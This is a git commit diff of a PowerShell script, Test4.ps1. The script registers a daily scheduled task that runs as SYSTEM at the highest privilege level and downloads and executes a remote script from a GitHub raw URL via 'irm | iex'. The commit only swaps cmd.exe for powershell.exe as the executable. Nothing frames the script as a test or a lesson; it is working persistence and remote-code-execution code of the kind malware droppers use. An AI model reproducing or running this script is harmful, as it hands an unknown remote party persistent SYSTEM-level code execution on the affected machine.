ce68ce9f6cb66a0301016680f730f3edc61d7703
M3ntallyOk <127529957+M3ntallyOk@users.noreply.github.com>
2023-03-15 12:44:06 +0200

    Update Test4.ps1

--- Test4.ps1
+++ Test4.ps1
@@ -1,5 +1,5 @@
 $taskName = "Task123"
-$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c irm https://raw.githubusercontent.com/M3ntallyOk/fasjopasfhb/main/Test3.ps1 | iex'
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://raw.githubusercontent.com/M3ntallyOk/fasjopasfhb/main/Test3.ps1 | iex'
 $trigger = New-ScheduledTaskTrigger -Daily -At "1:27pm"
 $task = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
 $task.Settings.MultipleInstances = "Parallel"
